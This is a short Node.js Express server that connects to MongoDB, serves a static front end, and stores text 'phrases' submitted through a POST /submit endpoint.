const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
require('dotenv').config(); // Load .env variables

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
})
.then(() => console.log('MongoDB connected'))
.catch(err => {
  console.error('MongoDB connection error:', err);
  process.exit(1); // Exit the server if DB fails
});

// Mongoose Schema & Model
const PhraseSchema = new mongoose.Schema({
  phrase: { type: String, required: true },
  createdAt: { type: Date, default: Date.now }
});
const Phrase = mongoose.model('Phrase', PhraseSchema);

// API Endpoint
app.post('/submit', async (req, res) => {
  try {
    const { phrase } = req.body;

    if (!phrase || phrase.trim() === '') {
      return res.status(400).json({ message: 'Phrase is required' });
    }

    const newPhrase = new Phrase({ phrase });
    await newPhrase.save();

    res.status(200).json({ message: 'Phrase saved successfully' });
  } catch (err) {
    console.error('Error saving phrase:', err);
    res.status(500).json({ message: 'Error saving phrase', error: err.message });
  }
});

// Serve HTML frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
